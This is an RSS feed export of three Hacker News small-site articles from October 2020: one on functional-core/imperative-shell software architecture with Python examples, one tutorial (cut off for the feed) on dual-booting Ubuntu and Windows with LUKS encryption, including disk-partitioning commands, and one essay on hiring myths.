<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 50]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 50. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Thu, 29 Oct 2020 20:16:26 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-50.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Thu, 29 Oct 2020 20:16:26 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[A Grand Unified Theory of Software Architecture]]>
            </title>
            <description>
<![CDATA[
Score 170 | Comments 85 (<a href="https://news.ycombinator.com/item?id=24915497">thread link</a>) | @nreece
<br/>
October 27, 2020 | https://danuker.go.ro/the-grand-unified-theory-of-software-architecture.html | <a href="https://web.archive.org/web/*/https://danuker.go.ro/the-grand-unified-theory-of-software-architecture.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
        <div>
    <section id="content">
        <article>
            
            <div>
                
                <p>Take <strong>Uncle Bob's</strong> Clean Architecture and map its correspondences with <strong>Gary Bernhardt's</strong> thin imperative shell around a functional core, and you get an understanding of how to cheaply maintain and scale software!</p>
<p>This is what <a href="https://rhodesmill.org/brandon/">Mr. Brandon Rhodes</a> did. It's not every day that I find such clear insight.</p>
<p>I am honored to have found his <a href="https://rhodesmill.org/brandon/talks/#clean-architecture-python">presentation</a> and <a href="https://rhodesmill.org/brandon/slides/2014-07-pyohio/clean-architecture/">slides</a> explaining  <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">Uncle Bob's Clean Architecture</a> and Gary Bernhardt's PyCon talks of <a href="https://archive.org/details/pyvideo_422___units-need-testing-too">2011</a>, <a href="https://pycon-2012-notes.readthedocs.io/en/latest/fast_tests_slow_tests.html">2012</a>, and <a href="https://www.destroyallsoftware.com/talks/boundaries">2013</a>.</p>
<p>Mr. Rhodes offers such a distilled view, that he can show you these crucial concepts in 3 slides of code. I will go ahead and summarize what he said and add a tiny bit of my insight.</p>
<p>Copyright of all Python code on this page belongs to <a href="https://rhodesmill.org/brandon/">Mr. Brandon Rhodes</a>, and copyright of the diagram belongs to <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">Robert C. Martin (Uncle Bob)</a>. I use these under (hopefully) fair use (nonprofit and educational).</p>


<p>First of all, we need to be on the same page, in order to be able to understand each other. Here are the words I'll use:</p>
<ul>
<li>Function: I use "function" or "pure function" to refer to a Python "function" that only uses its parameters for input, returns a result as output, and does not cause any other side-effects (such as I/O). <ul>
<li>A pure function returns the same output given the same inputs.</li>
<li>A pure function may be called any number of times without changing the system state - it should have no influence on DB, UI, other functions or classes.</li>
<li>This is very similar to a mathematical function: takes you from <em>x</em> to <em>y</em> and nothing else happens.</li>
<li>Sadly we can't have only pure functions; software has a <strong>purpose</strong> of causing side-effects.</li>
</ul>
</li>
<li>Procedure, Routine, or Subroutine: A piece of code that executes, that may or may not have side effects. This is a "function" in Python, but might not be a "pure function".</li>
<li>Tests: automated unit tests. By "unit" I mean not necessarily just a class, but a behavior. If you want, see more details in <a href="https://danuker.go.ro/tdd-revisited-pytest-updated-2020-09-03.html#update-2020-09-03-keep-coupling-low">the coupling chapter of my previous post</a>.</li>
</ul>

<div><pre><span></span><code><span>import</span> <span>requests</span>                      <span># Listing 1</span>
<span>from</span> <span>urllib</span> <span>import</span> <span>urlencode</span>

<span>def</span> <span>find_definition</span><span>(</span><span>word</span><span>):</span>
    <span>q</span> <span>=</span> <span>'define '</span> <span>+</span> <span>word</span>
    <span>url</span> <span>=</span> <span>'http://api.duckduckgo.com/?'</span>
    <span>url</span> <span>+=</span> <span>urlencode</span><span>({</span><span>'q'</span><span>:</span> <span>q</span><span>,</span> <span>'format'</span><span>:</span> <span>'json'</span><span>})</span>
    <span>response</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>url</span><span>)</span>     <span># I/O</span>
    <span>data</span> <span>=</span> <span>response</span><span>.</span><span>json</span><span>()</span>           <span># I/O</span>
    <span>definition</span> <span>=</span> <span>data</span><span>[</span><span>u</span><span>'Definition'</span><span>]</span>
    <span>if</span> <span>definition</span> <span>==</span> <span>u</span><span>''</span><span>:</span>
        <span>raise</span> <span>ValueError</span><span>(</span><span>'that is not a word'</span><span>)</span>
    <span>return</span> <span>definition</span>
</code></pre></div>
<p>Here, we have a piece of code that prepares a URL, then gets some data over the network (I/O), then validates the result (a word definition) and returns it.</p>
<p>This is a bit much: a procedure should ideally do one thing only. While this small-ish procedure is quite readable still, it is a metaphor for a more developed system - where it could be arbitrarily long.</p>
<p>The current knee-jerk reaction is to <em>hide</em> the I/O operations somewhere far away. Here is the same code after extracting the I/O lines:</p>

<div><pre><span></span><code><span>def</span> <span>find_definition</span><span>(</span><span>word</span><span>):</span>           <span># Listing 2</span>
    <span>q</span> <span>=</span> <span>'define '</span> <span>+</span> <span>word</span>
    <span>url</span> <span>=</span> <span>'http://api.duckduckgo.com/?'</span>
    <span>url</span> <span>+=</span> <span>urlencode</span><span>({</span><span>'q'</span><span>:</span> <span>q</span><span>,</span> <span>'format'</span><span>:</span> <span>'json'</span><span>})</span>
    <span>data</span> <span>=</span> <span>call_json_api</span><span>(</span><span>url</span><span>)</span>
    <span>definition</span> <span>=</span> <span>data</span><span>[</span><span>u</span><span>'Definition'</span><span>]</span>
    <span>if</span> <span>definition</span> <span>==</span> <span>u</span><span>''</span><span>:</span>
        <span>raise</span> <span>ValueError</span><span>(</span><span>'that is not a word'</span><span>)</span>
    <span>return</span> <span>definition</span>

<span>def</span> <span>call_json_api</span><span>(</span><span>url</span><span>):</span>
    <span>response</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>url</span><span>)</span>     <span># I/O</span>
    <span>data</span> <span>=</span> <span>response</span><span>.</span><span>json</span><span>()</span>           <span># I/O</span>
    <span>return</span> <span>data</span>
</code></pre></div>
<p>In Listing #2, the I/O is extracted from the top-level procedure. </p>
<p>The problem is, the code is still <strong>coupled</strong> - <code>call_json_api</code> is called whenever you want to test anything - even the building of the URL or the parsing of the result.</p>
<p><strong>Coupling kills software.</strong></p>
<p>A good rule of thumb to spot coupling is this: Can you test a piece of code without having to mock or dependency inject like Frankenstein?</p>
<p>Here, we can't test <code>find_definition</code> without somehow replacing <code>call_json_api</code> from inside it, in order to avoid making HTTP requests.</p>
<p>Let's find out what a better solution looks like.</p>

<div><pre><span></span><code><span>def</span> <span>find_definition</span><span>(</span><span>word</span><span>):</span>           <span># Listing 3</span>
    <span>url</span> <span>=</span> <span>build_url</span><span>(</span><span>word</span><span>)</span>
    <span>data</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>url</span><span>)</span><span>.</span><span>json</span><span>()</span>  <span># I/O</span>
    <span>return</span> <span>pluck_definition</span><span>(</span><span>data</span><span>)</span>

<span>def</span> <span>build_url</span><span>(</span><span>word</span><span>):</span>
    <span>q</span> <span>=</span> <span>'define '</span> <span>+</span> <span>word</span>
    <span>url</span> <span>=</span> <span>'http://api.duckduckgo.com/?'</span>
    <span>url</span> <span>+=</span> <span>urlencode</span><span>({</span><span>'q'</span><span>:</span> <span>q</span><span>,</span> <span>'format'</span><span>:</span> <span>'json'</span><span>})</span>
    <span>return</span> <span>url</span>

<span>def</span> <span>pluck_definition</span><span>(</span><span>data</span><span>):</span>
    <span>definition</span> <span>=</span> <span>data</span><span>[</span><span>u</span><span>'Definition'</span><span>]</span>
    <span>if</span> <span>definition</span> <span>==</span> <span>u</span><span>''</span><span>:</span>
        <span>raise</span> <span>ValueError</span><span>(</span><span>'that is not a word'</span><span>)</span>
    <span>return</span> <span>definition</span>
</code></pre></div>
<p>Here, the procedure at the top (aka. the <span><strong>imperative shell</strong></span> of the program) is handling the I/O, and everything else is moved to <span><strong>pure functions</strong></span> (<code>build_url</code>, <code>pluck_definition</code>). The <span><strong>pure functions</strong></span> are easily testable by just calling them on made-up data structures; no Frankenstein needed.</p>
<p>This separation into an <span><strong>imperative shell</strong></span> and <span><strong>functional core</strong></span> is an encouraged idea by Functional Programming.</p>
<p>Ideally, though, in a real system, you wouldn't test elements as small as these routines, but integrate more of the system. See <a href="https://danuker.go.ro/tdd-revisited-pytest-updated-2020-09-03.html#update-2020-09-03-keep-coupling-low">the coupling chapter of my previous post</a> to understand the trade-offs.</p>

<p>Look at <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">Uncle Bob's Clean Architecture chart</a> (Copyright Robert C. Martin aka. Uncle Bob) :
<img alt="The Clean Architecture" src="https://danuker.go.ro/images/CleanArchitecture.jpg"></p>
<p>Uncle Bob's <span><strong>Use Cases</strong></span> and <span><strong>Entities</strong></span> (red and yellow circles of the chart) map to the <span><strong>pure functions</strong></span> we saw earlier - <code>build_url</code> and <code>pluck_definition</code> from Listing 3, and the <span><strong>plain objects</strong></span> they receive as parameters and send as outputs. <em>(updated 2020-10-28)</em></p>
<p>Uncle Bob's <span><strong>Interface Adapters</strong></span> (green circle) map to the top-level <span><strong>imperative shell</strong></span>  from earlier - <code>find_definition</code> from Listing 3, handling only I/O to the outside (Web, DB, UI, other frameworks).</p>
<p><a href="https://www.reddit.com/r/programming/comments/jj7ave/the_grand_unified_theory_of_software_architecture/gabst6z/?context=3">Update 2020-10-28</a>: A "Model" object in today's MVC frameworks is a poisoned apple: it is not a <a href="https://khanlou.com/2014/12/pure-objects/">"pure" object</a> or <a href="http://xunitpatterns.com/Humble%20Object.html">"humble" object</a>, but one that can produce side effects like saving or loading from the database. Their "save" and "read" methods litter your code with untestable side-effects all over. Avoid them, or confine them to the periphery of your system and reduce their influence accordingly (they are actually a hidden <span><strong>Interface Adapter</strong></span>) due to interacting with the DB.</p>
<p>Notice the arrows on the left side of the circles, pointing inwards to more and more abstract parts. These are procedure or function calls. Our code is called by the outside. <strong>This has some exceptions. Whatever you do, the database won't call your app. But the web can, a user can through a UI, the OS can through STDIN, and a timer can, at regular intervals (such as in a game).</strong> <em>(updated 2020-10-28)</em></p>
<p>The top-level procedure:</p>
<ol>
<li>gets the input, </li>
<li>adapts it to simple objects acceptable to the system,</li>
<li>pushes it through the functional core,</li>
<li>gets the returned value from the functional core,</li>
<li>adapts it for the output device,</li>
<li>and pushes it out to the output device.</li>
</ol>
<p>This lets us easily test the functional core. Ideally, most of a production system should be pure-functional.</p>

<p>If you reduce the <span><strong>imperative shell</strong></span> and move code into the <span><strong>functional core</strong></span>, each test can verify almost the entire (now-functional) stack, but stopping short of actually performing external actions.</p>
<p>You can then test the imperative shell using <strong>fewer integration tests</strong>: you only need to check that it is <strong>correctly connected</strong> to the functional core.</p>
<p>Having two users for the system - the real user and the unit tests - and listening to both, lets you guide your architecture so as to <strong>minimize coupling</strong> and build a more <strong>flexible system</strong>.</p>
<p>Having a flexible system lets you implement new features and change existing ones <strong>quickly and cheaply</strong>, in order to <strong>stay competitive as a business</strong>.</p>
<p>Comments are much appreciated. I am yet to apply these insights, and I may be missing something!</p>
<p><strong>Edit 2020-10-28:</strong> I have tried out this methodology in some small TDD Katas, and together with TDD, it works great. But I am not employed right now, so I can't say I've <em>really</em> tried it.</p>
            </div>
            <!-- /.entry-content -->


        </article>
    </section>

        </div>
        
    </div>
</div></div>]]>
            </description>
            <link>https://danuker.go.ro/the-grand-unified-theory-of-software-architecture.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24915497</guid>
            <pubDate>Wed, 28 Oct 2020 05:19:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Dual-Boot Ubuntu 20.04 and Windows 10 with Encryption]]>
            </title>
            <description>
<![CDATA[
Score 71 | Comments 63 (<a href="https://news.ycombinator.com/item?id=24914573">thread link</a>) | @Fiveplus
<br/>
October 27, 2020 | https://www.mikekasberg.com/blog/2020/04/08/dual-boot-ubuntu-and-windows-with-encryption.html | <a href="https://web.archive.org/web/*/https://www.mikekasberg.com/blog/2020/04/08/dual-boot-ubuntu-and-windows-with-encryption.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <p><img src="https://www.mikekasberg.com/images/posts/dual-boot-encryption-full.jpg" alt="Image for "></p>
  <p><span>08 Apr 2020</span></p><p>When you run the Ubuntu installer, there’s an option to dual-boot Ubuntu with an
existing Windows installation. There’s also an option to encrypt your Ubuntu
installation, but <em>only if you erase everything and install ubuntu</em>. There’s no
automatic way to install Ubuntu alongside Windows 10 with encryption. And while
there are plenty of tutorials for dual-booting Ubuntu and Windows, many of them
are outdated – often referencing an MBR partition table – and almost none of
them seem to address encrypting your Ubuntu partition.</p>

<blockquote>
  <p>Dual-booting with encrypted storage should not be this hard in 2020.</p>

  <p>–Me, while figuring out how to do this.</p>
</blockquote>

<p>In reality, once you figure it out, it’s not that hard. The tricky thing is that
this isn’t well-documented <strong>anywhere</strong>! So I’m hoping to fix that with this
tutorial blog post. Honestly, if you know enough about Ubuntu to set up a
dual-boot with Windows, it’s only a little bit harder to do it with encryption.
I prepared this tutorial on a Dell Latitude e7450, and I fine-tuned it when I
tested it on my Dell Precision 5510. So it should work with almost no
modification on most Dell systems, and with only minor modifications
(particularly around BIOS setup) on most other types of computers.</p>

<h2 id="references">References</h2>

<p>To write this guide, I compiled information from several sources. Here are some
of the most useful references I found:</p>

<ul>
  <li><a href="https://gist.github.com/luispabon/db2c9e5f6cc73bb37812a19a40e137bc">XPS 15 9560 Dual-Boot with Encryption Notes</a>,
by <a href="https://gist.github.com/luispabon">luispabon</a>. I followed these notes pretty
closely, but modified some partition sizes and names based on other guides.</li>
  <li><a href="https://gist.github.com/mdziekon/221bdb597cf32b46c50ffab96dbec08a">XPS 15 9570 Dual-Boot with Encryption Notes</a>,
by <a href="https://gist.github.com/mdziekon">mdziekon</a>, upon which the above is based.</li>
  <li><a href="https://help.ubuntu.com/community/Full_Disk_Encryption_Howto_2019">Full Disk Encryption HowTo 2019</a>,
from the Ubuntu Community Wiki. This is a great resource, but deals with
encryption without dual-booting.</li>
  <li><a href="https://help.ubuntu.com/community/ManualFullSystemEncryption">Manual Full System Encryption</a>,
from the Ubuntu Community Wiki. This is longer, and isn’t focused on
dual-booting, but provides great details on the way certain things work.</li>
</ul>

<p>It is worth noting that this method doesn’t encrypt <code>/boot</code>. While there are
valid reasons for encrypting /boot, the graphical installer does not encrypt it
when you do a graphical install with LUKS. As such, I’m matching that precedent,
and keeping the simplicity of an unencrypted /boot partition. Thus, the guide
I’ve compiled below is just about the <strong>simplest way to have a LUKS encryption
with dual-boot.</strong></p>

<h2 id="why-encryption-is-important">Why encryption is important</h2>

<p>I began using encrypted storage on all my personal computers 5 or 6 years ago
after noticing that all the companies I’d worked for required it, and had good
reason to. Laptops get lost and stolen all the time. They’re high-value items
that are small and easy to carry. And when a thief gets your laptop, there’s
tons of valuable information on it that they can use or sell. Even if you use a
password to log in, it’s easy for an attacker to gain access to your data if
your disk isn’t encrypted – for example, by using a live USB stick. And once
they have that data, they might get access to online accounts, bank statements,
emails, and tons of other data. For me, an encrypted hard disk isn’t optional
anymore – its a necessity.</p>

<h2 id="an-overview">An Overview</h2>

<p>So what are we going to do? This tutorial will help you set up a system to
<strong>dual-boot Ubuntu 20.04 and Windows 10</strong>. (I haven’t tested it, but it should
work with most other modern versions (~16.04+) of Ubuntu or Windows.) The system
will use a GPT hard disk with UEFI (your BIOS must support UEFI). The Ubuntu
partition will be encrypted with LUKS.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> The Windows partition can optionally
be encrypted with BitLocker. I’m going to keep the Ubuntu installation as close
to a “default” installation as possible – no fancy tricks like a separate
<code>/home</code> partition, but it should be somewhat easy to add that yourself if you
really want to.</p>

<p>I’m going to start with a blank hard disk, installing both Windows 10 and Ubuntu
from scratch. If you already have Windows installed and you want to keep it, you
should be able to shrink your windows partition and join us in phase 3 (though
you might want to skim phases 1 and 2 to understand what we did).</p>

<p>To give you a broad overview of where we’re headed, here’s what we’re going to
do:</p>

<ol>
  <li>Prepare the installation media and computer</li>
  <li>Install Windows 10</li>
  <li>Create an encrypted partition for Ubuntu</li>
  <li>Install Ubuntu</li>
</ol>

<p>Of course, as with any new OS installation, you should back up any important
data before proceeding. <strong>The instructions below will erase all the data on your
hard disk.</strong> Proceed at your own risk; I’m not responsible for any damage or
data loss.</p>



<p>Since we’re installing both Windows 10 and Ubuntu from scratch, we’ll need a USB
stick for each. If you don’t already have a computer running Ubuntu or Windows,
making the installation media will be a little harder – but there are tutorials
for that and I’ll let you figure it out on your own.</p>

<ol>
  <li>Create a Windows Installer USB stick.  The easiest way is to use the <a href="https://www.microsoft.com/software-download/">Windows
10 Media Creation Tool</a> from a
computer that’s already running Windows.</li>
  <li>Create an Ubuntu 20.04 USB stick. The easiest way is to <a href="https://ubuntu.com/download/desktop">download the
ISO</a> and use the Startup Disk Creator on a
computer that’s already running Ubuntu.</li>
</ol>

<p>Great! We’ve got our USB sticks ready to go! One final thing before we get
started – we need to make sure our BIOS is set up correctly. In particular, we
want to make sure we’re using UEFI to boot our OS.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<p><img src="https://www.mikekasberg.com/images/dual-boot-encryption/dell-bios.jpg" alt="The Dell BIOS"></p>

<ol start="3">
  <li>Ensure your computer is running the latest BIOS available. This is important
because an out-of-date BIOS can have bugs, and those bugs sometimes affect
things like UEFI, non-Windows operating systems, or other components we’ll be
touching.</li>
  <li>Edit your BIOS settings. The following names are probably specific to Dell
BIOS, but other manufacturers will have similar settings.
    <ol>
      <li>Under <code>General</code> and <code>Boot Sequence</code>, make sure your <code>Boot
List Option</code> is set to <code>UEFI</code>.</li>
      <li>Under <code>General</code> and <code>Advanced Boot Options</code>, I disabled
<code>Legacy Option ROMs</code>. It’s important that both OSes install in UEFI mode.
(You can probably enable this when installation is complete if you care).</li>
      <li>Under <code>Security</code>, <code>TPM Security</code> must be enabled if you
want to easily set up BitLocker in Windows.</li>
      <li>I disabled <code>Secure Boot</code>. I’m not sure if this is absolutely required, and
you can try leaving it on or re-enabling it when you’re done if you want.</li>
    </ol>
  </li>
</ol>

<p>Now that our BIOS is configured for UEFI, we’re going to set up our hard disk.</p>

<div>
<p><b>For this tutorial, your BIOS must support UEFI!</b></p>
<p>Most modern computers support this, but if yours doesn't this tutorial won't
work for you. You should consider:</p>

<ul>
  <li>Installing only Linux with encryption using the graphical installer.</li>
  <li>OR Installing only Windows with encryption.</li>
  <li>OR Dual-booting Linux and Windows without encryption using Ubuntu's graphical installer.</li>
  <li>OR Finding another tutorial or figuring out how to do this with an MBR disk.</li>
</ul>
</div>

<ol start="5">
  <li><strong>Completely erase</strong> your hard disk and set it up for UEFI by doing the
following.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>
    <ol>
      <li>Boot your Ubuntu USB stick and use <code>Try without installing</code>.</li>
      <li>Open a terminal. Make it fullscreen while you’re at it.</li>
      <li>Figure out what your primary hard disk is called. It will probably be
either <code>/dev/sda</code> or <code>/dev/nvme0n1</code>. Importantly, it’s <strong>not</strong> <code>/dev/sda1</code> or
<code>/dev/nvme0n1p1</code> – those are partitions of the disk. One way to figure out what
yours is called is to run <code>lsblk</code> and look at the disk size. Throughout the rest
of this guide, I’m going to refer to <code>/dev/sda</code>. <strong>If yours is not
<code>/dev/sda</code>, replace <code>/dev/sda</code> with your own (perhaps <code>/dev/sdb</code> or
<code>/dev/nvme0n1</code>) for the rest of this guide.</strong></li>
      <li>
        <p>Run the following commands. This will initialize the drive as a GPT drive
and create a 550M EFI system partition formatted as FAT32.</p>

        <div><div><pre><code>$ sudo su
# sgdisk --zap-all /dev/sda
# sgdisk --new=1:0:+550M /dev/sda
# sgdisk --change-name=1:EFI /dev/sda
# sgdisk --typecode=1:ef00 /dev/sda
# mkfs.fat -F 32 /dev/sda1
</code></pre></div>        </div>
      </li>
    </ol>
  </li>
</ol>

<p>OK, phase 1’s complete. We have our installation media ready to go and the
computer’s BIOS and hard drive is set up correctly. Next, we’ll install Windows.</p>

<h2 id="phase-2-install-windows">Phase 2: Install Windows</h2>

<p>In this phase, we’re going to install Windows. Note that when we do this, we’re
going to leave some unallocated space to install Linux later. This is a good
approach because the Windows installer will mess with our partitions a little
bit, and its easier to let it do so before finalizing our Linux partitions.</p>

<p><img src="https://www.mikekasberg.com/images/dual-boot-encryption/windows-installer.jpg" alt="The Windows installer"></p>

<ol>
  <li>Boot from your Windows Installer USB stick.</li>
  <li>Choose a <code>Custom (advanced)</code> install to get to the Windows partitioning tool.</li>
  <li>Create a new partition. The size of this partition should be the amount of
disk space you want to use for Windows. In this example, I did 80G since the SSD
on my computer is relatively small. If unsure, do about half of your hard
disk.</li>
  <li>Windows will warn you that it is going to create an extra system partition.
This is good.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
  <li>Install Windows onto the partition you just made. There’s no need to format
any partitions – the Windows installer will take care of that for you.</li>
  <li>When the Windows installation is finished, log in and enable BitLocker on
drive <code>C:</code>. This will automatically create yet another partition on your disk
(a Windows recovery partition) - which is why we’re doing it before
partitioning for Ubuntu.</li>
</ol>

<p>At this point, you can start using Windows. But I’d avoid doing too much setup
or personalization yet so you don’t have to do it again if something goes wrong
below. If you want to double check your partitions, this is what you’ll be left
with after installing Windows and enabling BitLocker:</p>

<div><div><pre><code>ubuntu@ubuntu:~$ sudo sgdisk --print /dev/sda
Disk /dev/sda: 500118192 sectors, 238.5 GiB

Number  Start (sector)    End (sector)  Size       Code  Name
   1            2048         1128447   550.0 MiB   EF00  EFI
   2         1128448         1161215   16.0 MiB    0C01  Microsoft reserved ...
   3         1161216       167825076   79.5 GiB    0700  Basic data partition
   4       167825408       168900607   525.0 MiB   2700
</code></pre></div></div>

<h2 id="phase-3-partition-the-drive-for-ubuntu">Phase 3: Partition the drive for Ubuntu</h2>

<p>This is the trickiest phase since this is where we need to manually set up our
encrypted disks for Ubuntu. We’re going to make it work very similar to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mikekasberg.com/blog/2020/04/08/dual-boot-ubuntu-and-windows-with-encryption.html">https://www.mikekasberg.com/blog/2020/04/08/dual-boot-ubuntu-and-windows-with-encryption.html</a></em></p>]]>
            </description>
            <link>https://www.mikekasberg.com/blog/2020/04/08/dual-boot-ubuntu-and-windows-with-encryption.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24914573</guid>
            <pubDate>Wed, 28 Oct 2020 02:56:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hiring Myths Common in Hacker News Discussions]]>
            </title>
            <description>
<![CDATA[
Score 111 | Comments 137 (<a href="https://news.ycombinator.com/item?id=24911758">thread link</a>) | @Ozzie_osman
<br/>
October 27, 2020 | https://somehowmanage.com/2020/10/27/4-hiring-myths-common-in-hackernews-discussions/ | <a href="https://web.archive.org/web/*/https://somehowmanage.com/2020/10/27/4-hiring-myths-common-in-hackernews-discussions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-222">

	

	
	<div>
		
<p>Another day, another HackerNews discussion about hiring being broken. The most recent one I saw was triggered by <a href="https://blog.alinelerner.com/ive-been-an-engineer-and-a-recruiter-hiring-is-broken-heres-why-and-heres-what-it-should-be-like-instead/">a blog post</a> by the formidable Aline Lerner (disclaimer: Aline is a friend and we collaborated on a <a href="https://www.holloway.com/g/technical-recruiting-hiring/about">hiring book</a> last year). Now, I 100% agree that hiring is broken, and Aline’s post is really thoughtful. In fact, a lot of “hiring is broken” articles are thoughtful.</p>



<p>But the discussion threads are something else—they miss the point of the article. The discussion threads are even more broken than hiring. And they’re really repetitive. They always do contain grains of truth, but inevitably have us reaching conclusions that are simplistic, and in my opinion, create a pretty bad attitude in the tech industry.</p>



<p><strong>Conclusion #1: “Hiring sucks for candidates, but hiring managers can do what they want</strong>“</p>



<p>The truth is that hiring is hard for everyone. There’s no question about it. It’s hard for both candidates and for hiring managers. Sure, FAANGs and the startup-du-jour might have a leg up, but most people who are hiring are trying to hire at a non-FAANG, non-sexy company. If you’ve never done it, you should try it at some point in your career. It’s an <em>incredibly </em>humbling experience. Or, at the very least, find a friend who’s spent time on hiring, and ask them for their favorite battle story. They’ve been ghosted by candidates. They’ve spent hours trying to convince people to talk to them. They’ve spent even more time getting candidates to the offer stage, only to lose out to the FAANG / startup-du-jour.</p>



<p>And yes, on the balance, power and information asymmetry work out in favor of the companies hiring. And that asymmetry is much larger with FAANGs. But even FAANGs have to invest a tremendous amount of time and energy into hiring. It’s not really easy for anyone. </p>



<p>Especially if you want to do it <em>well</em>. Ask any successful leader (entrepreneur, manager) what they spend most of their time on, and it’ll either involve a large chunk spent on hiring (if they appreciate the problem and give it the attention it deserves) or dealing with the consequences of bad hiring (if they don’t).</p>



<p><strong>Conclusion #2: “Hiring is a crap-shoot—it’s a roll of the dice</strong>“</p>



<p>I strongly disagree with this one. When writing the <a href="https://www.holloway.com/g/technical-recruiting-hiring">Holloway Guide to Technical Hiring and Recruiting</a>, I got to interview dozens of really thoughtful hiring managers and recruiters. They were really good at their jobs. And there were some common themes. They were thoughtful about every step of their process. They kept their process balanced and fair, holding a high bar but respecting candidates and their time. They didn’t chase the same pool of candidates everyone else was chasing—instead, they found non-traditional ways to discover really talented and motivated people who weren’t in the pool of usual suspects. They were thoughtful about what signals they were looking for and how best to assess them. And, they deeply understood their team’s needs, and candidates’ needs, and were really good at deciding when there was or wasn’t a fit. But most of all, they were effective: they built really talented teams.</p>



<p>There are a handful of companies that have built amazing hiring engines, and the proof is that they’ve been able to put together really strong teams. You can generally tell that if a person worked at a certain company at a certain time, that person is probably incredibly intelligent and incredibly motivated (some examples are Google, Facebook, Stripe, Dropbox at different points in time). There will always be noise. Even the best hiring managers will sometimes make hiring mistakes. And of course, even the best engineers may not be a fit for every role or every company. </p>



<p>Again, hiring is hard. But there is not a shred of doubt in my mind that if you are thoughtful about it, you can hire well. And really, you don’t need to be perfect at it. You just need to be better than the rest.</p>



<p><strong>Conclusion #3: “FAANGs suck at hiring”</strong></p>



<p>This one has some truth to it, but it’s a lot more subtle than “FAANGs suck at hiring”. Because let’s face it, they do hire really smart people. Some of the smartest people I know are at FAANGs right now. So let’s decouple that statement a little more.</p>



<p>FAANGs <em>do </em>suck at parts of hiring, like their candidate experience. They can be really slow at making hiring decisions. Their hiring process might be tedious and seem arbitrary. But <em>they usually can get away with it</em>, <em>and you probably can’t!</em> They’ve got a strong brand, interesting technical challenges (interesting for some people, at least), and a lot of money. In fact, one FAANG VP of Engineering told me: “our process is what we can get away with”. To the point that they can even play it off as a positive: “our process is slow and long because we are <em>very</em> selective”.</p>



<p>And look, I’m sure FAANGs lose some talented candidates who get turned off by their “you’d-be-blessed-to-work-with-us” attitude. They definitely have a lot of room for improvement. But at the end of the day, they’re operating a process that’s delivering large quantities of really smart people at scale. In fact, I’d argue their internal processes around strategy, performance management / promotions, etc cause incredibly <em>more</em> damage to them than broken hiring—if you lose out on hiring one talented person when you have thousands applying to work for you, that’s one story, but if you hire someone really talented and driven, and they work for you for 6 to 12 months but don’t meet their potential and leave in bitter frustration… well, that’s a subject for another post)</p>



<p>“But”, people go on, “FAANGs <em>also</em> don’t know how to interview!” Which brings me to trope #4.</p>



<p><strong>Conclusion #4: “Whiteboard</strong> <strong>and algo/coding interviews suck”</strong></p>



<p>Again, this one has some truth to it, but if you just stop at the above statement, you miss the point.</p>



<p>Algo/coding interviews are one of the primary hiring mechanisms used by FAANG companies. And they are incredibly unpopular—at least in discussion threads. But big companies have spent years looking at their hiring data and feeding that back into their hiring process (coining the term “<a href="https://rework.withgoogle.com/subjects/people-analytics/">people analytics</a>” along the way).</p>



<p>The argument against them is usually a combination of:</p>



<ul><li>they really only assess pattern-matching skills (map a problem to something you’ve seen before)</li><li>they only assess willingness to spend time preparing for these types of interviews</li></ul>



<p>These are fair criticisms, but that doesn’t mean these interviews are actually terrible. I mean, they might be terrible for you if you’re interviewing and you don’t get the job. You’re probably a brilliant engineer, and I agree, these interviews certainly don’t fully assess your ability (or maybe you’re a shit engineer, I don’t know you personally). In any case, the leap from “this interview sucked for me” to “this interview sucks” is still pretty big.</p>



<p>If you’re a large tech co with a big brand and a salary scale that ranks at the top of&nbsp;<a href="https://www.levels.fyi/">Levels.fyi</a>, you probably get a lot of applications. So a good interview process is one that weeds out people who wouldn’t do well at your company. To do well at a large tech company, you need to (and I’m painting with a really broad brush, but this is true for 90% of roles at these companies):</p>



<ol><li>Some sort of problem-solving skill that’s a mix of raw intelligence and/or ability to solve problems by pattern-matching to things you’ve seen before.</li><li>Ability/commitment to work on something that may not&nbsp;<em>always&nbsp;</em>be that intrinsically motivating, in the context of getting/maintaining a well-paying job at a large, known company.</li></ol>



<p>Hopefully you can see where I’m going with this. Basically, the very criticisms thrown at these types of interviews are the reason they work well for these companies. They’re a good proxy for the work you’d be doing there and how willing you are to do it. If you’re good at pattern matching, and are willing to invest effort into practicing to get one of these jobs, you’ll probably do well at the job.</p>



